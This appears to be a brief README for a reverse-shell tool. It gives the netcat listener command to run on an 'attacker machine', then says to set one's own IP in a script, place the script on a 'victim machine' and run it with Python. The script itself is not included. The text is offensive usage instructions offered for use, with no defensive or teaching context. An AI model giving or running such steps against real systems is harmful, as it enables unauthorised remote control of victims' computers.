# reverse shell

run at attacker machine to wait connection
```bash
nc -nlvk -p 5555 -s 0.0.0.0
```

change at script - ip address, to personal

then store script at victim machine and run script

```bash
python main.py
```
